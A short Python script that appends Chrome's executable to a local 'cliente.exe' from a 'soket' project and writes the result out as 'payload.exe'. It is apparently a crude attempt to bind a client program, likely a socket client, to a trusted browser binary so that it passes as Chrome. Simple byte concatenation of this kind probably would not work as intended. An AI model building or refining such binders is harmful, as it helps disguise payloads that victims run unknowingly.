import os

def combiexe(fi1,fi2,saliexe):
    with open(fi1,'rb') as f1, open(fi2,'rb') as f2:
        data1 = f1.read()
        data2 = f2.read()

    combined_data = data1 + data2
    print(combined_data)

    with open(saliexe,'wb') as f_out:
        f_out.write(combined_data)


combiexe("C:\\Users\\garra\\Documents\\git\\soket\\stocek\\dist\\cliente.exe","C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","C:\\Users\\garra\\Documents\\git\\soket\\stocek\\dist\\payload.exe")